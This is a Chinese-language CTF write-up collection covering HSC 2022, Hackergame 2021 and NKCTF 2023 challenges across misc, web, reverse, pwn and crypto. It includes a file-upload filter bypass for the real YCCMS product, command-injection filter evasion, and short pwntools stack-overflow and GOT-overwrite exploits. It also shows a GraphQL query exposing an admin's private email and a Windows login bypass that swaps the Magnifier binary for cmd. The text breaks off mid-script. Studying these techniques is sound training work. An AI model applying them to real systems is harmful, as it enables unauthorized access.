<h2 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h2><p>下载下来解压提示压缩文件已损坏，看到开头是<code>PK</code>，结尾是<code>IEND</code>，直接foremost，得到一个加密压缩包和一张图片<br>分离出的图片存在lsb隐写，藏了一张图片，<code>save bin</code>导出<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-WIRESHARK-1.png"></p>
<p>发现是一张二维码，扫码得到<code>wrsak..iehr370</code><br>但是用来解压压缩包提示密码错误，观察后发现前面是wireshark单词的错位，栅栏一下得到<code>wireshark3.7.0</code></p>
<p>解压后得到一个<code>wireshark</code>文件<br>以<code>%</code>开头，以<code>%%EOF</code>结尾，明显是pdf文件，但是头被删去了一部分，所以打不开<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-WIRESHARK-2.png"></p>
<p>补上<code>PDF</code>，使用<code>wbStego4.3open</code>工具，空密码成功解出flag</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Web-sign-in"><a href="#Web-sign-in" class="headerlink" title="Web-sign in"></a>Web-sign in</h2><p>提示<code>你知道robots协议吗？</code>，访问robots.txt，得到<code>fiag_ls_h3re.php</code></p>
<p>ctrl+u，F12等被禁用，使用<code>view-source:</code>查看源代码，得到flag</p>
<h2 id="CLICK"><a href="#CLICK" class="headerlink" title="CLICK"></a>CLICK</h2><p>抓不到包，说明是js控制的<br>逐个查看，最后在<code>main.js</code>中发现一串<code>ZmxhZ3thYzk5Y2M2ZC04NWFmLTRiNmItODNlZS0yYjNjYWMwOTg3Y2J9Cg==</code>，解码得到flag</p>
<h2 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h2><p>题目过滤了一部分字母和符号，但是还可以绕过<br>空格用<code>$&#123;IFS&#125;</code>代替，<code>ls</code>和<code>nl</code>这些字母用<code>\</code>转义,因为是exec，所以最后输出到文件</p>
<p>先找flag文件名和位置<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-exec-1.png"></p>
<p>查看flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-exec-2.png"></p>
<h2 id="CMS-SYSTEM"><a href="#CMS-SYSTEM" class="headerlink" title="CMS SYSTEM"></a>CMS SYSTEM</h2><p>首页可以得知是<code>YCCMS</code>,漏洞库查找历史漏洞，发现存在未授权更改密码，任意文件上传等等</p>
<p>更改密码：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-CMS_SYSTEM-1.jpg"></p>
<p>文件上传：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-CMS_SYSTEM-2.jpg"></p>
<p>分析：<br>LogoUpload.class.php:<br>先将值以<code>.</code>打散为数组，且只检查数组中第二个值是否为png，所以<code>1.png.php</code>即可绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkType</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;name)[<span class="hljs-number">1</span>],<span class="hljs-variable">$this</span>-&gt;typeArr)) &#123;<br>			<span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertBack</span>(<span class="hljs-string">&#x27;警告：LOGO图片必须是PNG格式！&#x27;</span>);<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
<p>最后文件会被重命名为<code>logo.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setNewName</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-variable">$_nameArr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;name);<br>		<span class="hljs-variable">$_postfix</span> = <span class="hljs-variable">$_nameArr</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$_nameArr</span>)-<span class="hljs-number">1</span>];<br>		<span class="hljs-comment">//$_newname = date(&#x27;YmdHis&#x27;).mt_rand(100,1000).&#x27;.&#x27;.$_postfix;</span><br>		<span class="hljs-variable">$_newname</span> = <span class="hljs-string">&#x27;logo.&#x27;</span>.<span class="hljs-variable">$_postfix</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;linkpath = UPLOGO.<span class="hljs-variable">$_newname</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;path.<span class="hljs-variable">$_newname</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>

<p>访问php<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-CMS_SYSTEM-3.jpg"></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="hiahia-o-▽-┛"><a href="#hiahia-o-▽-┛" class="headerlink" title="hiahia o(*^▽^*)┛"></a>hiahia o(*^▽^*)┛</h2><p>将输入的字符与被flag函数修改过的v4进行比较<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-hiahia-1.png"><br>然后根据flag函数与v4变量的数据得出脚本<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-hiahia-2.png"></p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span>  i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">9</span>:<br>            <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>:<br>                    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i])+<span class="hljs-number">13</span>)<br>            <span class="hljs-keyword">else</span>:<br>                    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i])-<span class="hljs-number">11</span>)<br>    <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>:<br>                    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i])+<span class="hljs-number">5</span>)<br>            <span class="hljs-keyword">else</span>:<br>                    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i])-<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>


<h2 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h2><p>安卓逆向的话先安装一下<br>随便输入一个值让它判断一下<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-ANDROID-1.jpg"></p>
<p>随便一个逆向软件中搜索字符串<code>FLAG错误</code><br>这里用jadx，得到关键代码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-ANDROID-2.jpg"></p>
<p>代码的大概意思是索引值为单数的异或下一个成员，为双数的异或索引值，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">17</span>; i++) &#123;<br>            iArr2[i] = i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> ? charArray[i] ^ i : charArray[i] ^ charArray[i + <span class="hljs-number">1</span>];<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>解题代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">102</span>, <span class="hljs-number">13</span>, <span class="hljs-number">99</span>, <span class="hljs-number">28</span>, <span class="hljs-number">127</span>, <span class="hljs-number">55</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">121</span>, <span class="hljs-number">58</span>, <span class="hljs-number">83</span>, <span class="hljs-number">30</span>, <span class="hljs-number">79</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>, <span class="hljs-number">42</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)-<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>:<br>            a[i]=a[i]^a[i+<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>            a[i]=a[i]^i<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a]))<br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-ANDROID-3.jpg"></p>
<h2 id="WAY"><a href="#WAY" class="headerlink" title="WAY"></a>WAY</h2><p>有壳先脱壳<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-WAY-1.png"></p>
<p>一个走迷宫的题目<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-WAY-2.png"></p>
<p>找到地图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-WAY-3.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-WAY-4.png"></p>
<p><code>OIIIIOOIO#IOOOIIOIOIIIIII</code></p>
<p>刚好五个分为一组,从左上角走到#<br>用键盘表示路径就是<code>sdsddwd</code>，md5后就是flag了</p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Ez-pwn"><a href="#Ez-pwn" class="headerlink" title="Ez_pwn"></a>Ez_pwn</h2><p>因为使用了gets函数，没有对输入数据进行限制，所以导致了栈溢出<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-Ez_pwn-1.png"><br>接着执行后门函数获取flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-Ez_pwn-2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;hsc2019.site&#x27;</span>,<span class="hljs-number">10679</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x400741</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-Ez_pwn-3.png"></p>
<h2 id="EZPWN"><a href="#EZPWN" class="headerlink" title="EZPWN"></a>EZPWN</h2><p>程序让我们写入地址并向地址写入数据<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-EZPWN-1.png"></p>
<p>那么我们可以修改got表 使某个函数执行 后门函数<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-EZPWN-2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;pwn2&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=remote(<span class="hljs-string">&#x27;hsc2019.site&#x27;</span>,<span class="hljs-number">10257</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;ID?&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;address?&#x27;</span>,<span class="hljs-built_in">str</span>(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]).encode())<br>p.send(p64(<span class="hljs-number">0x400796</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/HSC-EZPWN-3.png"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Easy-SignIn"><a href="#Easy-SignIn" class="headerlink" title="Easy SignIn"></a>Easy SignIn</h2><p>base16–&gt;base64–&gt;base32–&gt;base64</p>
<blockquote>
<p>flag{welc0me_to_my_s1gn_in}</p>
</blockquote>
<h2 id="AFFINE"><a href="#AFFINE" class="headerlink" title="AFFINE"></a>AFFINE</h2><p>先爆破a和b<br><code>assert (&quot;flag&quot; in m)</code>表示明文中存在flag<br>然后因为<code>(a*b+c)%62= (a%62)*(b%62)+c%62</code>，所以a和b小于62</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2</span><br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> hashlib<br><br>letter=string.ascii_letters+string.digits<br>e=<span class="hljs-string">&quot;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&quot;</span><br>a1,b1=<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(e)-<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>):<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>):<br>            <span class="hljs-keyword">if</span> ((letter.index(<span class="hljs-string">&#x27;f&#x27;</span>)*a+b)%<span class="hljs-number">62</span>)==(letter.index(e[i])):<br>                <span class="hljs-keyword">if</span> ((letter.index(<span class="hljs-string">&#x27;l&#x27;</span>)*a+b)%<span class="hljs-number">62</span>)==(letter.index(e[i+<span class="hljs-number">1</span>])):<br>                    <span class="hljs-keyword">if</span> ((letter.index(<span class="hljs-string">&#x27;a&#x27;</span>)*a+b)%<span class="hljs-number">62</span>)==(letter.index(e[i+<span class="hljs-number">2</span>])):<br>                        <span class="hljs-keyword">if</span> ((letter.index(<span class="hljs-string">&#x27;g&#x27;</span>)*a+b)%<span class="hljs-number">62</span>)==(letter.index(e[i+<span class="hljs-number">3</span>])):<br>                            a1,b1=a,b<br><br>flag=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>):<br>        <span class="hljs-keyword">if</span> (j*a1+b1)%<span class="hljs-number">62</span>==letter.index(i):<br>            flag.append(j)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(hashlib.md5(<span class="hljs-string">&#x27;&#x27;</span>.join(letter[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag)).hexdigest())<br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>HSC1th</tag>
        <tag>2022</tag>
      </tags>
  </entry>
  <entry>
    <title>Hackergame 2021-图之上的信息-wp</title>
    <url>/wp/Hackergame%202021-%E5%9B%BE%E4%B9%8B%E4%B8%8A%E7%9A%84%E4%BF%A1%E6%81%AF.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做这题之前还从来没碰到过<code>GraphQL</code>这个技术，记录一下</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。<br>你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？</p>
<h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><p>谷歌找到的一篇<a href="https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/">文章</a><br>查所有可用的字段<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/GraphQL-1.png"></p>
<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>先guest&#x2F;guest登陆<br>然后在<code>/graphql</code>接口中查到需要的email字段<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/GraphQL-2.png"></p>
<p>最后查询 <code>&#123;&quot;query&quot;:&quot;&#123; user(id:1) &#123; privateEmail &#125;&#125;&quot;&#125;</code> 即可得到 flag。<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/GraphQL-3.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>GraphQL</tag>
        <tag>hackergame2021</tag>
      </tags>
  </entry>
  <entry>
    <title>2023NKCTF-wp</title>
    <url>/wp/NKCTF2023.html</url>
    <content><![CDATA[<p>rank：15</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png"></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hard-misc"><a href="#hard-misc" class="headerlink" title="hard-misc"></a>hard-misc</h2><p><code>base32</code>，公众号发<code>NKCTF2023我来了！</code></p>
<h2 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h2><p>先导入进vmware，开机发现是windows2008系统，用户带密码</p>
<p>挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-3.png"></p>
<p>复制一份cmd到放大镜</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-4.png"></p>
<p>左下角启动放大镜功能后就启动了cmd，修改administrator密码</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-1.png"></p>
<p>进入系统</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-2.png"></p>
<h2 id="easymusic"><a href="#easymusic" class="headerlink" title="easymusic"></a>easymusic</h2><p>根据提示百度搜到了类似的一题<a href="https://cloud.tencent.com/developer/article/1676153">2020天翼杯-音频隐写</a></p>
<p>使用<code>OpenPuff</code>工具</p>
<p>文件尾得到<code>psdC:01374890</code></p>
<p>频谱找到<code>PSdB:74208645</code></p>
<p>波形转换得到<code>psdA:83979367</code></p>
<p>导出flag.txt</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easymusic-1.png"></p>
<h2 id="easy-rgb"><a href="#easy-rgb" class="headerlink" title="easy_rgb"></a>easy_rgb</h2><p>montage+gaps画图<br><code>montage *.png -tile 12X15 -geometry +0+0 flag.png</code><br><code>gaps --image=flag.png --generation=30 --population=300 --size=125</code></p>
<p>得到key：<code>NKCTF2023</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_rgb-1.png"></p>
<p><code>r</code>,<code>g</code>,<code>b</code>转成<code>zip</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">r=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;r.txt&#x27;</span>).read()<br>g=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;g.txt&#x27;</span>).read()<br>b=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.txt&#x27;</span>).read()<br>e=<span class="hljs-string">&quot;&quot;</span><br>m=<span class="hljs-built_in">max</span>([<span class="hljs-built_in">len</span>(r),<span class="hljs-built_in">len</span>(b),<span class="hljs-built_in">len</span>(g)])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    <span class="hljs-keyword">try</span>:<br>        e+=r[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=g[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=b[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p>得到hint：<code>AES-128</code>和data：<code>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+</code></p>
<p>在线aes-128解密，key为<code>NKCTF2023</code></p>
<h2 id="first-spam-of-rabbit-year"><a href="#first-spam-of-rabbit-year" class="headerlink" title="first spam of rabbit year"></a>first spam of rabbit year</h2><p><a href="https://www.spammimic.com/decode.cgi">垃圾邮件</a>解密得到<code>佛曰：栗楞穆婆悉遮俱吉室嚧无佛吉埵沙他蒙蒙唎皤啰烁伽驮数迦帝楞萨那摩度驮伽度耶萨那曳喝写怛钵遮耶烁埵室摩迦尼菩呼阇栗墀豆哆烁利吉舍阿萨俱夜嚧蒙喝喝诃罚悉阇喝无数那迦陀室沙穆皤南陀娑利烁输夜输参陀数醯诃提耶钵遮夜栗谨伽俱菩度咩烁室醯迦输诃度唎阇钵无羯栗提摩谨咩悉哆阇室悉钵楞那他伽啰伊耶谨那尼那呼伊罚卢输南喝豆娑伽唎醯嚧那嚧羯摩吉参喝那阿地墀数陀楞啰孕罚度醯菩萨埵埵栗他穆菩参舍迦羯沙啰吉尼楞怛尼孕苏地遮苏提曳谨阇那啰阇南曳输曳伊苏伊度啰咩提苏他他娑驮俱婆钵室利烁俱伽写利羯悉阇遮皤佛南悉阿帝萨喝悉阇参参楞罚皤苏喝墀诃他吉伽提利尼埵啰输嚧醯婆伽墀菩唎娑谨他怛写沙伽啰烁摩栗埵伊啰俱楞帝写地卢利怛吉帝陀阿唵伊伽谨曳阇羯娑羯嚧埵唎烁楞喝曳输他阿室钵谨啰楞他呼娑喝菩哆蒙穆诃婆烁他夜孕穆诃钵佛参室悉舍萨穆室遮阿喝啰伽耶喝漫</code></p>
<p>社会主义核心价值观解密得到<code>rabbit 又 move</code></p>
<p>佛曰加个又，key是<code>rabbit</code>，解密得到密文</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">&amp;​​​​‍‎‏auD5​​​​‏‍​v&#x27;&lt;)​​​​‏‍‌`h​​​​‎​‏&#123;dF6C_*&#x27;Jrcqzrh&amp;ZaF&gt;`g^​​​​‏‍‌Hr&#x27;&#125;vuHZJB​​​​‎​‏%~&#125;_H5?gu​​​​‌‏‏;q​​​​‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13<br></code></pre></td></tr></table></figure>

<p>0宽得到key：<code>EnoOoO1G</code></p>
<p>根据结尾的提示，密文rot47，key rot13</p>
<p>得到<code>U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH</code>和<code>RabBbB1T</code></p>
<p>在线rabbit得到<code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></p>
<h2 id="misc-iot"><a href="#misc-iot" class="headerlink" title="misc?iot!"></a>misc?iot!</h2><p><a href="https://www.anquanke.com/post/id/229321">参考文章</a></p>
<p>选择<code>arm little-endian</code></p>
<p>如果要写地址默认为<code>0x8000000</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-1.png"></p>
<p>sub_800014C是rc4生成密钥的过程</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-2.png"></p>
<p>复制密钥的过程，得到key：<code>NKCTF2023</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-3.png"></p>
<p>从V5开始的18个字节是密文，小端序提取出来：<code>245F02E287A0A76C072A75DA3F8A57D71A1F</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-4.png"></p>
<p>在线rc4解密得到<code>NKCTF&#123;H3l10_stm32&#125;</code></p>
<h2 id="easy-word"><a href="#easy-word" class="headerlink" title="easy_word"></a>easy_word</h2><p>根据注释中的提示爆破密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>base=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>**<span class="hljs-number">4</span>):<br>    d=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        d.append(base[j%<span class="hljs-number">62</span>])<br>        j=j//<span class="hljs-number">62</span><br>    d=<span class="hljs-built_in">tuple</span>(d)<br>    e=<span class="hljs-string">&quot;h%s%svO%s%s0&quot;</span>%d<br>    <span class="hljs-built_in">hash</span>=hashlib.sha256(e.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;b75d1224&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">hash</span>[:<span class="hljs-number">8</span>]:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure>

<p>改成zip解压，<code>media</code>目录下有一张<code>image1.png</code>，图片上有key：<code>Welcome_to_NKCTF</code></p>
<p><code>cloacked-pixel</code>得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_word-1.png"></p>
<h2 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h2><p>stegsolve观察发现<code>green</code>和<code>blue</code>有数据，脚本提取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.bmp&#x27;</span>)<br>d=a.getdata()<br>w,h=a.size<br>e=[]<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        i=a.getpixel((x,y))<br>        e.append(<span class="hljs-built_in">chr</span>((i[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+i[<span class="hljs-number">2</span>]))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(e))<br></code></pre></td></tr></table></figure>

<p>得到<code>NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;</code></p>
<h2 id="easy-bmp"><a href="#easy-bmp" class="headerlink" title="easy_bmp"></a>easy_bmp</h2><p>在010中分别修改高和宽，得到key：<code>BMP_Height_width_easy</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_bmp-1.png"></p>
<p>解压后得到<code>flag.bmp</code>，继续爆破宽高，<code>360*360</code>，扫二维码得到flag</p>
<p><code>NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;</code></p>
<h2 id="baby-music"><a href="#baby-music" class="headerlink" title="baby_music"></a>baby_music</h2><p>010打开，发现很多重复的<code>10 27</code>和<code>11 27</code></p>
<p>将<code>10 27</code>转为<code>0</code>，<code>11 27</code>转为<code>1</code></p>
<p>二进制转文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.wav&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()[<span class="hljs-number">0x2c</span>:]<br>e=[]<br>q=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">if</span> d[i]==<span class="hljs-number">0x10</span>:<br>        q+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        q+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(q)==<span class="hljs-number">8</span>:<br>        e.append(<span class="hljs-built_in">int</span>(q,<span class="hljs-number">2</span>))<br>        q=<span 